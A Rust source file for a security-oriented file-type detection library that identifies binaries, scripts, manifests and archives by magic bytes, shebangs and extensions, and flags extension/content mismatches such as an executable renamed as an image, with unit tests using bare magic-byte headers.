//! Fast file format identification by magic bytes, shebangs, and extensions.
//!
//! `fileid` identifies file formats using a three-stage pipeline:
//!
//! 1. **Content** — magic bytes and shebangs (first 256 bytes)
//! 2. **Filename/Extension** — well-known names and extension mapping
//! 3. **Heuristics** — lightweight pattern matching (first 2 KB, no tree-sitter)
//!
//! Content is trusted first. Extension is a fallback. If neither yields a result,
//! the file is unidentifiable and `detect` returns `None`.
//!
//! # Example
//!
//! ```
//! use filefacts::{FileId, FileType};
//!
//! let data = b"\x7fELF\x02\x01\x01\x00";
//! let id = FileId::from_bytes(data);
//! assert_eq!(id.file_type(), FileType::Elf);
//! ```

mod ext;
mod heuristics;
mod magic;

use std::path::Path;

use serde::Serialize;

/// Result of file-format identification.
///
/// `FileId` is the public face of file detection: it carries the
/// identified [`FileType`], the [`DetectionSource`] that determined it,
/// and a flag for cases where the file's extension disagrees with its
/// content. The detection pipeline never returns "unknown plus an
/// error" — failures collapse to [`FileType::Unknown`].
///
/// Access state through the accessor methods ([`Self::file_type`],
/// [`Self::source`], [`Self::extension_mismatch`]); the fields stay
/// crate-private so new state can be added without breaking
/// downstream consumers.
#[derive(Debug, Clone, Copy, Serialize)]
#[non_exhaustive]
pub struct FileId {
    pub(crate) file_type: FileType,
    pub(crate) source: DetectionSource,
    pub(crate) extension_mismatch: bool,
    /// When `extension_mismatch` holds, the type the *extension* implied
    /// (`None` when the extension is absent or unrecognized). Lets callers
    /// describe the mismatch as a content-group→extension-group transition
    /// without deciding, here, whether that transition is dangerous.
    pub(crate) mismatch_ext_type: Option<FileType>,
}

impl FileId {
    /// Identify a byte slice without reference to any filename.
    ///
    /// Equivalent to passing an empty path to [`Self::from_path_and_bytes`].
    /// Always succeeds; unidentifiable input is reported as
    /// `FileType::Unknown` rather than as an error.
    #[must_use]
    pub fn from_bytes(bytes: &[u8]) -> Self {
        Self::from_path_and_bytes(Path::new(""), bytes)
    }

    /// Identify a byte slice with the original filename / extension
    /// available. Extensions inform the result only as a tiebreaker —
    /// content always wins when magic bytes are conclusive.
    #[must_use]
    pub fn from_path_and_bytes(path: &Path, bytes: &[u8]) -> Self {
        match detect(path, bytes) {
            Some(d) => {
                // Apply benign carve-outs (AppleDouble sidecars, Android APK,
                // XHTML) so the reported mismatch is an evasion signal rather
                // than a known format convention. FreeBSD `.pkg` zstd is already
                // resolved as Consistent during detection.
                let mismatch =
                    d.extension_mismatch() && !is_benign_extension_mismatch(path, bytes, d);
                Self {
                    file_type: d.file_type,
                    source: d.source,
                    extension_mismatch: mismatch,
                    mismatch_ext_type: if mismatch { d.extension_type() } else { None },
                }
            }
            None => Self {
                file_type: FileType::Unknown,
                source: DetectionSource::Heuristic,
                extension_mismatch: false,
                mismatch_ext_type: None,
            },
        }
    }

    /// The identified file type.
    #[must_use]
    pub fn file_type(&self) -> FileType {
        self.file_type
    }

    /// How the type was determined.
    #[must_use]
    pub fn source(&self) -> DetectionSource {
        self.source
    }

    /// `true` when content-based detection disagrees with the file's
    /// extension. Useful as a low-friction evasion signal. Benign format
    /// conventions (AppleDouble sidecars, Android APK, XHTML, FreeBSD pkg)
    /// are excluded.
    #[must_use]
    pub fn extension_mismatch(&self) -> bool {
        self.extension_mismatch
    }

    /// When [`Self::extension_mismatch`] holds, the coarse
    /// `(content_group, extension_group)` transition — e.g. `("binary",
    /// "image")` for a PE named `.png`. The extension group is `"unknown"`
    /// when the extension is unrecognized (e.g. `.woff2` carrying a PE).
    ///
    /// This deliberately reports *what kind* of mismatch occurred and leaves
    /// the severity call to the consumer: a `.docx` named `.doc`
    /// (`document`→`document`) is mundane, while a PE named `.jpeg`
    /// (`binary`→`image`) is a masquerade. Returns `None` when there is no
    /// genuine mismatch.
    #[must_use]
    pub fn extension_mismatch_transition(&self) -> Option<(&'static str, &'static str)> {
        if !self.extension_mismatch {
            return None;
        }
        let content = file_group(self.file_type);
        let ext = self.mismatch_ext_type.map_or("unknown", file_group);
        Some((content, ext))
    }
}

/// Coarse content category for a [`FileType`], used to describe an
/// extension/content mismatch as a `content_group → extension_group`
/// transition. Kept exhaustive so a new [`FileType`] forces a category choice.
fn file_group(ft: FileType) -> &'static str {
    match ft {
        FileType::MachO
        | FileType::Elf
        | FileType::Pe
        | FileType::JavaClass
        | FileType::PythonBytecode
        | FileType::Beam
        | FileType::Lnk => "binary",
        // Interpreted scripting languages (cleave's `scripts` for-group).
        FileType::Shell
        | FileType::Batch
        | FileType::Jcl
        | FileType::Vbs
        | FileType::Python
        | FileType::JavaScript
        | FileType::Ruby
        | FileType::Php
        | FileType::Perl
        | FileType::Lua
        | FileType::PowerShell
        | FileType::AppleScript => "script",
        // Compiled / typed source languages (cleave's `source` for-group).
        FileType::TypeScript
        | FileType::Go
        | FileType::Rust
        | FileType::Java
        | FileType::C
        | FileType::CSharp
        | FileType::Swift
        | FileType::ObjectiveC
        | FileType::Groovy
        | FileType::Scala
        | FileType::Kotlin
        | FileType::Zig
        | FileType::Elixir
        | FileType::Clojure => "source",
        FileType::PackageJson
        | FileType::PackageLockJson
        | FileType::VsixManifest
        | FileType::ChromeManifest
        | FileType::CargoToml
        | FileType::PyProjectToml
        | FileType::ComposerJson
        | FileType::Json
        | FileType::Gyp
        | FileType::GithubActions
        | FileType::SystemdService
        | FileType::DesktopEntry
        | FileType::Xml
        | FileType::PkgInfo
        | FileType::SrcInfo
        | FileType::GoMod
        | FileType::GoSum
        | FileType::CargoLock
        | FileType::RequirementsTxt
        | FileType::PoetryLock
        | FileType::PipfileLock
        | FileType::GemfileLock
        | FileType::ComposerLock
        | FileType::YarnLock
        | FileType::PnpmLock
        | FileType::Plist
        | FileType::Makefile
        | FileType::Dockerfile => "config",
        FileType::Jar
        | FileType::Zip
        | FileType::Tar
        | FileType::TarGz
        | FileType::TarBz2
        | FileType::TarXz
        | FileType::TarZst
        | FileType::Gz
        | FileType::Bz2
        | FileType::Xz
        | FileType::Zst
        | FileType::SevenZ
        | FileType::Rar
        | FileType::Deb
        | FileType::Rpm
        | FileType::PkgMacos
        | FileType::Dmg
        | FileType::Cab
        | FileType::Chm
        | FileType::Crx
        | FileType::Xpi
        | FileType::Whl
        | FileType::Gem
        | FileType::ApkAndroid
        | FileType::ApkAlpine
        | FileType::Npm
        | FileType::Crate
        | FileType::Conda
        | FileType::Egg
        | FileType::Nupkg
        | FileType::Ipa
        | FileType::Vsix
        | FileType::PkgFreebsd
        | FileType::PkgArch
        | FileType::Asar => "archive",
        FileType::Rtf | FileType::OleDoc | FileType::Ooxml | FileType::Pdf | FileType::Odf => {
            "document"
        }
        FileType::Jpeg | FileType::Png => "image",
        FileType::Html | FileType::Markdown | FileType::Text => "text",
        FileType::Pickle | FileType::Data | FileType::Unknown => "data",
    }
}

/// File format identified by fileid.
///
/// Variants cover binary formats, source languages, package manifests, archives,
/// and document types. Manifest types (e.g. `PackageJson`, `CargoToml`) are included
/// because they require format-specific analysis despite being syntactically JSON/TOML.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
#[derive(serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FileType {
    /// Mach-O binary (macOS/iOS executable or library)
    MachO,
    /// ELF binary (Linux/Unix executable or shared library)
    Elf,
    /// PE binary (Windows executable, DLL)
    Pe,
    /// Unix shell script (bash, sh, zsh, etc.)
    Shell,
    /// Windows batch file (.bat, .cmd)
    Batch,
    /// IBM z/OS Job Control Language batch script (.jcl)
    Jcl,
    /// VBScript source file (.vbs, .vbe, .wsf, .wsc)
    Vbs,
    /// Python source file (.py)
    Python,
    /// JavaScript source file (.js, .mjs, .cjs)
    JavaScript,
    /// TypeScript source file (.ts, .tsx)
    TypeScript,
    /// Go source file (.go)
    Go,
    /// Rust source file (.rs)
    Rust,
    /// Java source file (.java)
    Java,
    /// Compiled Java bytecode (.class)
    JavaClass,
    /// Python compiled bytecode (.pyc)
    PythonBytecode,
    /// Erlang/Elixir compiled BEAM bytecode (.beam; `FOR1`…`BEAM` IFF container)
    Beam,
    /// Java archive (.jar, .war, .ear)
    Jar,
    /// Ruby source file (.rb)
    Ruby,
    /// PHP source file (.php)
    Php,
    /// Perl source file (.pl, .pm)
    Perl,
    /// Lua source file (.lua)
    Lua,
    /// C# source file (.cs)
    CSharp,
    /// PowerShell script (.ps1, .psm1)
    PowerShell,
    /// Swift source file (.swift)
    Swift,
    /// Objective-C source file (.m, .mm)
    ObjectiveC,
    /// Groovy source file (.groovy)
    Groovy,
    /// Scala source file (.scala)
    Scala,
    /// Kotlin source file (.kt, .kts)
    Kotlin,
    /// Zig source file (.zig)
    Zig,
    /// Elixir source file (.ex, .exs)
    Elixir,
    /// Clojure / ClojureScript / EDN source (.clj, .cljs, .cljc, .cljr, .edn, .bb)
    Clojure,
    /// C source file (.c, .h)
    C,
    /// npm package.json manifest
    PackageJson,
    /// npm package-lock.json lockfile
    PackageLockJson,
    /// VSCode extension manifest (.vsixmanifest)
    VsixManifest,
    /// Chrome extension manifest.json
    ChromeManifest,
    /// Rust Cargo.toml manifest
    CargoToml,
    /// Rust Cargo.lock lockfile — pins every crate to an exact version + sha256.
    CargoLock,
    /// Python pip requirements file (requirements.txt) — `name==version` pins.
    RequirementsTxt,
    /// Python Poetry lockfile (poetry.lock) — resolved package set.
    PoetryLock,
    /// Python Pipenv lockfile (Pipfile.lock) — resolved package set with hashes.
    PipfileLock,
    /// Ruby Bundler lockfile (Gemfile.lock) — resolved gem set with versions.
    GemfileLock,
    /// PHP Composer lockfile (composer.lock) — resolved package set with dists.
    ComposerLock,
    /// Yarn lockfile (yarn.lock) — resolved npm package set with integrity.
    YarnLock,
    /// pnpm lockfile (pnpm-lock.yaml) — resolved npm package set with integrity.
    PnpmLock,
    /// Python pyproject.toml manifest
    PyProjectToml,
    /// PHP composer.json manifest
    ComposerJson,
    /// Generic JSON document (.json)
    Json,
    /// node-gyp build manifest (binding.gyp, .gyp, .gypi). JSON-shaped build
    /// config; its `<!(...)`/`<!@(...)` command-expansion runs arbitrary shell
    /// during `node-gyp configure` (npm runs this automatically on install of a
    /// package containing binding.gyp), a known supply-chain execution vector.
    Gyp,
    /// GitHub Actions workflow YAML
    GithubActions,
    /// systemd service unit file (.service, .service.d/*.conf)
    SystemdService,
    /// freedesktop.org Desktop Entry (.desktop) - XDG application launcher / autostart
    DesktopEntry,
    /// Generic XML document (.xml, MSBuild .csproj, SVG, XML config files, etc.)
    Xml,
    /// Python package metadata (PKG-INFO, METADATA)
    PkgInfo,
    /// Arch/AUR generated package metadata (.SRCINFO) — normalized mirror of PKGBUILD
    SrcInfo,
    /// Go module manifest (go.mod) — `require` directives are declared dependencies.
    GoMod,
    /// Go module checksum database (go.sum) — pins every module to an `h1:` hash.
    GoSum,
    /// ZIP archive (zip, apk, ipa, nupkg, etc.)
    Zip,
    /// TAR archive (plain, no compression)
    Tar,
    /// Gzip-compressed TAR (.tar.gz, .tgz, .crate)
    TarGz,
    /// Bzip2-compressed TAR (.tar.bz2, .tbz2)
    TarBz2,
    /// XZ-compressed TAR (.tar.xz, .txz)
    TarXz,
    /// Zstandard-compressed TAR (.tar.zst, .xbps)
    TarZst,
    /// Gzip-compressed single file (.gz, not a tar)
    Gz,
    /// Bzip2-compressed single file (.bz2, not a tar)
    Bz2,
    /// XZ-compressed single file (.xz, not a tar)
    Xz,
    /// Zstandard-compressed single file (.zst, not a tar)
    Zst,
    /// 7-Zip archive (.7z)
    SevenZ,
    /// RAR archive (.rar)
    Rar,
    /// Debian package (.deb)
    Deb,
    /// RPM package (.rpm)
    Rpm,
    /// macOS installer package (.pkg, XAR format). Named `PkgMacos` (not bare
    /// `Pkg`) because the `.pkg` extension is ambiguous: FreeBSD and Arch also
    /// use it for compressed-tar packages, disambiguated by container magic.
    PkgMacos,
    /// Apple Disk Image (.dmg, UDIF container).
    Dmg,
    /// Cabinet archive (.cab)
    Cab,
    /// Compiled HTML Help (.chm) — Microsoft ITSF/ITOL container with
    /// LZX-compressed HTML topics. Common malware delivery vector.
    Chm,
    /// Chrome extension (.crx)
    Crx,
    /// Mozilla Firefox extension (.xpi) — ZIP container with WebExtension or
    /// legacy XUL layout. Disambiguated from generic ZIP so the XPI-specific
    /// signing-scheme shape (`META-INF/mozilla.*`, `META-INF/cose.*`) can be
    /// surfaced.
    Xpi,
    /// Python wheel (.whl) — ZIP container with PEP 427 layout. Distinct
    /// from generic ZIP so the wheel-specific surface (dist-info, RECORD,
    /// native-extension count, top-level packages) can be extracted.
    Whl,
    /// RubyGems package (.gem) — uncompressed `ustar` tar holding
    /// `metadata.gz` (gzipped `Gem::Specification` YAML), `data.tar.gz`, and
    /// `checksums.yaml.gz`. Distinct from generic tar so the gem's external
    /// identity metadata can be surfaced as `gem.*`.
    Gem,
    /// Android application package (.apk) — ZIP container (`AndroidManifest.xml`,
    /// `classes.dex`). Disambiguated from the Alpine `.apk` by container magic
    /// (`PK` zip vs gzip tar) so each ecosystem gets its own model.
    ApkAndroid,
    /// Alpine Linux package (.apk) — gzip-concatenated tar (signature ‖ control
    /// ‖ data) carrying `.PKGINFO`. Disambiguated from the Android `.apk` by
    /// container magic (gzip vs `PK` zip).
    ApkAlpine,
    /// npm package (.tgz) — gzip tar with everything under a `package/` prefix
    /// (`package/package.json`). Disambiguated from a generic gzip tar by that
    /// marker, so npm supply-chain signal (install scripts, bin shims) routes
    /// to its own model.
    Npm,
    /// Rust crate (.crate) — gzip tar laid out as `<name>-<version>/` with a
    /// `Cargo.toml` at its root. The `.crate` extension is cargo-specific.
    Crate,
    /// conda package (.conda) — ZIP holding `metadata.json` plus zstd-compressed
    /// `info-*`/`pkg-*` tars. Distinct from generic ZIP so conda identity
    /// (`info/index.json`) routes to its own model.
    Conda,
    /// Python egg (.egg) — ZIP with an `EGG-INFO/` directory (`PKG-INFO`).
    Egg,
    /// NuGet package (.nupkg) — ZIP carrying a `*.nuspec` manifest.
    Nupkg,
    /// iOS application archive (.ipa) — ZIP with `Payload/*.app/Info.plist`.
    Ipa,
    /// VS Code / Open VSX extension (.vsix) — ZIP carrying
    /// `extension.vsixmanifest`. Distinct from the manifest file type
    /// [`FileType::VsixManifest`], which is that inner XML alone.
    Vsix,
    /// FreeBSD package (.pkg) — zstd-compressed tar whose first member is the
    /// `+COMPACT_MANIFEST` / `+MANIFEST` metadata. Disambiguated from the macOS
    /// `.pkg` by container magic (zstd-tar vs `xar!`) and from Arch by the
    /// `+MANIFEST` marker.
    PkgFreebsd,
    /// Arch Linux package (.pkg.tar.zst) — zstd-compressed tar whose first
    /// member is `.PKGINFO`. Disambiguated from FreeBSD by that marker.
    PkgArch,
    /// Electron ASAR application archive (.asar)
    Asar,
    /// AppleScript source file (.applescript, .scpt)
    AppleScript,
    /// Apple Property List (.plist)
    Plist,
    /// Rich Text Format document (.rtf)
    Rtf,
    /// Legacy Microsoft Office document (OLE2/CFBF: .doc, .xls, .ppt, .msg)
    OleDoc,
    /// Modern Microsoft Office document (OOXML: .docx, .xlsx, .pptx)
    Ooxml,
    /// Windows Shell Link file (.lnk)
    Lnk,
    /// JPEG image
    Jpeg,
    /// PNG image
    Png,
    /// Python pickle serialized data (.pkl, .pickle, .joblib)
    Pickle,
    /// PDF document
    Pdf,
    /// HTML document (.html, .htm)
    Html,
    /// Markdown document (.md, .markdown)
    Markdown,
    /// Makefile / GNU Make build file
    Makefile,
    /// Dockerfile — container image build definition
    Dockerfile,
    /// OpenDocument Format (.odt, .ods, .odp, .odg) — ZIP-based office documents
    Odf,
    /// Plain text data (.txt, .text, or printable text with no stronger type)
    Text,
    /// Opaque binary data (.dat, .bin, .payload, .raw) — commonly carries
    /// encrypted/XOR'd malware payloads. Routed through the generic analyzer
    /// so string extraction, entropy, and encoded-payload detection still fire.
    Data,
    /// File type could not be determined
    Unknown,
}

impl FileType {
    /// Returns true if this file type represents executable code (binaries, scripts,
    /// manifests, archives, or document formats that can carry exploits).
    #[must_use]
    pub fn is_program(&self) -> bool {
        !matches!(
            self,
            Self::Unknown | Self::Html | Self::Markdown | Self::Odf
        )
    }

    /// Returns true if this file type is an archive or compressed container.
    #[must_use]
    pub fn is_archive(&self) -> bool {
        matches!(
            self,
            Self::Zip
                | Self::Tar
                | Self::TarGz
                | Self::TarBz2
                | Self::TarXz
                | Self::TarZst
                | Self::Gz
                | Self::Bz2
                | Self::Xz
                | Self::Zst
                | Self::SevenZ
                | Self::Rar
                | Self::Deb
                | Self::Rpm
                | Self::PkgMacos
                | Self::Dmg
                | Self::Cab
                | Self::Chm
                | Self::Crx
                | Self::Xpi
                | Self::Whl
                | Self::Gem
                | Self::ApkAndroid
                | Self::ApkAlpine
                | Self::Npm
                | Self::Crate
                | Self::Conda
                | Self::Egg
                | Self::Nupkg
                | Self::Ipa
                | Self::Vsix
                | Self::PkgFreebsd
                | Self::PkgArch
                | Self::Asar
                | Self::Jar
        )
    }

    /// Returns true if this file type is a compiled native binary.
    #[must_use]
    pub fn is_binary(&self) -> bool {
        matches!(
            self,
            Self::Elf
                | Self::Pe
                | Self::MachO
                | Self::JavaClass
                | Self::PythonBytecode
                | Self::Beam
        )
    }

    /// Returns true if cleave supports analysis of this file type.
    /// All currently identified types are supported; this is future-proofing.
    #[must_use]
    pub fn is_supported(&self) -> bool {
        self.is_program()
    }

    /// Returns true if this file type represents source code with AST support.
    #[must_use]
    pub fn is_source_code(&self) -> bool {
        matches!(
            self,
            Self::Python
                | Self::Ruby
                | Self::JavaScript
                | Self::TypeScript
                | Self::Php
                | Self::Perl
                | Self::Lua
                | Self::CSharp
                | Self::C
                | Self::Rust
                | Self::Shell
                | Self::PowerShell
                | Self::Kotlin
                | Self::Java
                | Self::Go
                | Self::Swift
                | Self::ObjectiveC
                | Self::Groovy
                | Self::Scala
                | Self::Zig
                | Self::Elixir
        )
    }

    /// Returns true for structured-manifest formats whose entire content is
    /// parsed into the `values` tree (JSON/TOML/YAML manifests, plist, etc.).
    ///
    /// For these, the structured view *is* the content surface, so the
    /// `strings(1)`-tier byte scan is suppressed — re-scanning the same bytes
    /// would only duplicate the parsed tree as noise. This covers only the
    /// named formats that are always fully parsed; generic `Json`/`Gyp` are
    /// size-limited and intentionally fall back to a text scan when skipped.
    #[must_use]
    pub fn is_structured_data(&self) -> bool {
        matches!(
            self,
            Self::PackageJson
                | Self::PackageLockJson
                | Self::ComposerJson
                | Self::ChromeManifest
                | Self::CargoToml
                | Self::CargoLock
                | Self::PoetryLock
                | Self::PipfileLock
                | Self::ComposerLock
                | Self::PnpmLock
                | Self::PyProjectToml
                | Self::GithubActions
                | Self::Plist
                | Self::PkgInfo
                | Self::SrcInfo
        )
    }
}

/// How the file type was identified.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
#[derive(serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DetectionSource {
    /// Magic bytes at the start of the file.
    Magic,
    /// Shebang line (`#!...`).
    Shebang,
    /// Well-known filename (e.g. `package.json`, `action.yml`).
    Filename,
    /// File extension mapping.
    Extension,
    /// Lightweight content heuristics (pattern matching).
    Heuristic,
    /// Extension overrode a shebang juke (e.g. `.js` file with `#!/bin/bash`).
    /// `extension_type()` returns the type the shebang claimed.
    ExtensionOverridesShebang,
}

/// What the file extension implies about the content.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ExtensionMatch {
    /// Extension maps to the same type as content detection, or no extension present.
    Consistent,
    /// Extension maps to a different known type.
    Different(FileType),
    /// Extension is present but not recognized by fileid.
    Unknown,
}

/// Result of file format identification.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Detection {
    /// The identified file type.
    pub file_type: FileType,
    /// How we identified it.
    pub source: DetectionSource,
    /// Relationship between detected type and file extension.
    ext_match: ExtensionMatch,
}

impl Detection {
    /// True when content-based detection identified a different type than
    /// the file's extension implies.
    ///
    /// This covers two cases:
    /// - Extension maps to a *different* known type than content detected
    /// - Extension is present but *unknown* to fileid (e.g. `.woff2` containing PE)
    ///
    /// Returns false when:
    /// - Detection was extension/filename-based (no conflict possible)
    /// - The file has no extension
    /// - The extension maps to the same type as content detection
    #[must_use]
    pub fn extension_mismatch(&self) -> bool {
        matches!(
            self.source,
            DetectionSource::Magic
                | DetectionSource::Shebang
                | DetectionSource::Heuristic
                | DetectionSource::ExtensionOverridesShebang
        ) && !matches!(self.ext_match, ExtensionMatch::Consistent)
    }

    /// True when content was identified as a script language but the
    /// shebang juked toward a different scripting language. Callers can
    /// use this to label the mismatch as "shebang juke" rather than the
    /// generic extension/content disagreement.
    #[must_use]
    pub fn is_shebang_juke(&self) -> bool {
        self.source == DetectionSource::ExtensionOverridesShebang
    }

    /// The file type implied by the extension, if any.
    /// `None` when the extension is absent, unrecognized, or matches the detected type.
    #[must_use]
    pub fn extension_type(&self) -> Option<FileType> {
        match self.ext_match {
            ExtensionMatch::Different(ft) => Some(ft),
            _ => None,
        }
    }
}

/// True when a shebang→extension mismatch should be treated as evasion.
///
/// Specifically: a shell shebang on a file whose extension claims a different
/// scripting language. We treat the extension as authoritative in this case.
/// We deliberately do NOT generalise to all script-vs-script mismatches —
/// `#!/usr/bin/env python3` on a `.py` file with no other indicators is fine.
fn is_shebang_juke(detected: FileType, ext_type: FileType) -> bool {
    matches!(detected, FileType::Shell)
        && matches!(
            ext_type,
            FileType::JavaScript
                | FileType::TypeScript
                | FileType::Python
                | FileType::Ruby
                | FileType::Php
                | FileType::Perl
                | FileType::Lua
        )
}

fn allows_heuristic_extension_override(file_type: FileType) -> bool {
    matches!(
        file_type,
        FileType::Zip
            | FileType::Jar
            | FileType::Xpi
            | FileType::Whl
            | FileType::Ooxml
            | FileType::Odf
            | FileType::Cab
            | FileType::Chm
            | FileType::Rar
            | FileType::SevenZ
    )
}

fn has_yaml_extension(path: &Path) -> bool {
    let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
        return false;
    };
    ext.eq_ignore_ascii_case("yml") || ext.eq_ignore_ascii_case("yaml")
}

/// True when an extension/content disagreement is a known benign format
/// convention rather than an evasion signal. Mirrors the carve-outs cleave
/// previously applied before emitting `metadata/file-extension-mismatch`.
fn is_benign_extension_mismatch(path: &Path, data: &[u8], det: Detection) -> bool {
    // macOS AppleDouble sidecars (`._name`) carry resource-fork bytes whose
    // type intentionally differs from the extension — convention, not evasion.
    if path
        .file_name()
        .and_then(|n| n.to_str())
        .is_some_and(|n| n.starts_with("._"))
    {
        return true;
    }
    let Some(ext_type) = det.extension_type() else {
        return false;
    };
    let content = det.file_type;
    let name_ends_ci = |suffix: &str| {
        path.file_name().and_then(|n| n.to_str()).is_some_and(|n| {
            n.len() >= suffix.len() && n[n.len() - suffix.len()..].eq_ignore_ascii_case(suffix)
        })
    };
    // Android/Alpine APK: `.apk` (extension maps to Zip) resolved by container
    // magic to the ecosystem-specific type. Both are legitimate `.apk`s — the
    // disambiguation is the point, not an evasion signal.
    if name_ends_ci(".apk")
        && ext_type == FileType::Zip
        && matches!(content, FileType::ApkAndroid | FileType::ApkAlpine)
    {
        return true;
    }
    // Content detection refined a generic-archive extension to a specific
    // package ecosystem (npm `.tgz`, Arch/FreeBSD `.pkg*`). The extension's
    // generic archive type and the content's specific archive type agree on
    // being an archive — a benign refinement, not a masquerade.
    if matches!(
        content,
        FileType::Npm | FileType::PkgFreebsd | FileType::PkgArch
    ) && ext_type.is_archive()
    {
        return true;
    }
    // XHTML served with a `.html` extension but parsed as XML.
    if ext_type == FileType::Html && content == FileType::Xml {
        let n = data.len().min(4096);
        let prefix = String::from_utf8_lossy(&data[..n]).to_ascii_lowercase();
        return prefix.contains("<!doctype html") || prefix.contains("<html");
    }
    false
}

/// Detect file type from content + path. Content is trusted first, extension as fallback.
///
/// Returns `None` if the file format cannot be identified.
#[must_use]
pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
    // Stage 1: Content-based detection (magic bytes, shebangs)
    if let Some((file_type, source)) = magic::detect_from_content(path, data) {
        let ext_ft = ext::detect_from_path(path);

        // Shebang-juke override: when the shebang claims a different scripting
        // language than the file's extension implies, and both languages are
        // plausible (script ↔ script), prefer the extension. The shebang is
        // a 12-byte string an attacker can prepend to any file; the extension
        // is what the user/loader treats the file as. JavaScript ".js" carrying
        // a "#!/bin/bash" shebang is a textbook static-analysis evasion seen
        // in the npm xmlrpc supply-chain compromise (2024) and similar.
        if source == DetectionSource::Shebang {
            if let Some(ext_type) = ext_ft {
                if ext_type != file_type && is_shebang_juke(file_type, ext_type) {
                    // Distinct source variant lets callers tell the juke case
                    // apart from a normal shebang detection. ext_match stores
                    // the type the shebang claimed.
                    return Some(Detection {
                        file_type: ext_type,
                        source: DetectionSource::ExtensionOverridesShebang,
                        ext_match: ExtensionMatch::Different(file_type),
                    });
                }
            }
        }

        let ext_match = match ext_ft {
            Some(e) if e != file_type => ExtensionMatch::Different(e),
            None if file_type == FileType::GithubActions && has_yaml_extension(path) => {
                ExtensionMatch::Consistent
            }
            None if path.extension().is_some() => ExtensionMatch::Unknown,
            Some(_) | None => ExtensionMatch::Consistent,
        };
        return Some(Detection {
            file_type,
            source,
            ext_match,
        });
    }

    // Stage 2: Well-known filename match (LICENSE, package.json, Makefile,
    // …). These are explicit names users type — no aliasing or content
    // ambiguity, so they outrank both heuristics and extension fallback.
    if ext::is_filename_match(path) {
        if let Some(file_type) = ext::detect_from_path(path) {
            return Some(Detection {
                file_type,
                source: DetectionSource::Filename,
                ext_match: ExtensionMatch::Consistent,
            });
        }
    }

    let ext_ft = ext::detect_from_path(path);
    let heuristic_may_override_ext = ext_ft.is_none_or(allows_heuristic_extension_override);

    // Stage 3: Content heuristics for unknown extensions and extension-claimed
    // containers/polyglots. Ordinary source extensions stay authoritative here:
    // language keyword scoring is too weak to override `.go`, `.js`, `.swift`,
    // etc. Container extensions are different because a non-magic `.zip` body
    // may be a script payload wearing an archive name.
    if heuristic_may_override_ext && !ext::is_data_format(path) {
        if let Some(file_type) = heuristics::detect_from_content(data) {
            let ext_match = match ext_ft {
                Some(e) if e != file_type => ExtensionMatch::Different(e),
                None if path.extension().is_some() => ExtensionMatch::Unknown,
                Some(_) | None => ExtensionMatch::Consistent,
            };
            return Some(Detection {
                file_type,
                source: DetectionSource::Heuristic,
                ext_match,
            });
        }
    }

    // Stage 4: Extension fallback (used when no content-first detector resolved
    // and the filename was not well-known).
    if let Some(file_type) = ext_ft {
        // HTML extension requires content validation
        if file_type == FileType::Html && !heuristics::looks_like_html(data) {
            return None;
        }
        return Some(Detection {
            file_type,
            source: DetectionSource::Extension,
            ext_match: ExtensionMatch::Consistent,
        });
    }

    None
}

/// Detect file type from content alone (magic bytes + shebangs only).
///
/// Does not consider file extensions or heuristics.
#[must_use]
pub fn detect_content(data: &[u8]) -> Option<Detection> {
    let path = Path::new("");
    magic::detect_from_content(path, data).map(|(file_type, source)| Detection {
        file_type,
        source,
        ext_match: ExtensionMatch::Consistent,
    })
}

/// Detect file type from path/extension alone.
///
/// Does not examine file content.
#[must_use]
pub fn detect_path(path: &Path) -> Option<Detection> {
    ext::detect_from_path(path).map(|file_type| Detection {
        file_type,
        source: if ext::is_filename_match(path) {
            DetectionSource::Filename
        } else {
            DetectionSource::Extension
        },
        ext_match: ExtensionMatch::Consistent,
    })
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;

    // Helper: assert detection result
    fn assert_detect(path: &str, data: &[u8], expected: FileType) {
        let Some(det) = detect(Path::new(path), data) else {
            panic!("expected {expected:?} for {path}, got None");
        };
        assert_eq!(det.file_type, expected, "wrong type for {path}");
    }

    fn assert_ext(path: &str, expected: FileType) {
        assert_detect(path, b"x = 1\n", expected);
    }

    // ── Binary formats (magic bytes) ─────────────────────────────────

    #[test]
    fn macho_magic() {
        assert_detect(
            "binary",
            &[0xFE, 0xED, 0xFA, 0xCE, 0, 0, 0, 0],
            FileType::MachO,
        );
        assert_detect(
            "binary",
            &[0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0],
            FileType::MachO,
        );
        // Fat binary (nfat_arch=2, not Java class range)
        assert_detect(
            "binary",
            &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 2],
            FileType::MachO,
        );
    }

    #[test]
    fn elf_magic() {
        assert_detect(
            "a.out",
            b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            FileType::Elf,
        );
    }

    #[test]
    fn elf_mismatch() {
        let data = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        let det = detect(Path::new("malware.jpg"), data).unwrap();
        assert_eq!(det.file_type, FileType::Elf);
        assert!(det.extension_mismatch());
        assert_eq!(det.extension_type(), Some(FileType::Jpeg));
    }

    #[test]
    fn pe_magic() {
        assert_detect("app.exe", b"MZ\x90\x00\x03\x00\x00\x00", FileType::Pe);
    }

    #[test]
    fn pe_extension_is_consistent() {
        let det = detect(Path::new("app.exe"), b"MZ\x90\x00\x03\x00\x00\x00").unwrap();
        assert_eq!(det.file_type, FileType::Pe);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn pe_mismatch() {
        let det = detect(Path::new("font.woff2"), b"MZ\x90\x00\x03\x00\x00\x00").unwrap();
        assert_eq!(det.file_type, FileType::Pe);
        assert!(det.extension_mismatch());
    }

    // ── AppleDouble (._<name>) resource forks ────────────────────────────
    // Regression guard: a benign Composer tarball lit up at suspicious
    // because cleave classified macOS resource forks (`._foo.php`) as PHP
    // and then ran obfuscation traits over their binary bodies. Magic-byte
    // detection must return Unknown so `is_program()` skips analysis.

    #[test]
    fn appledouble_magic_returns_unknown() {
        // AppleDouble: 00 05 16 07 + version + filler + entry table.
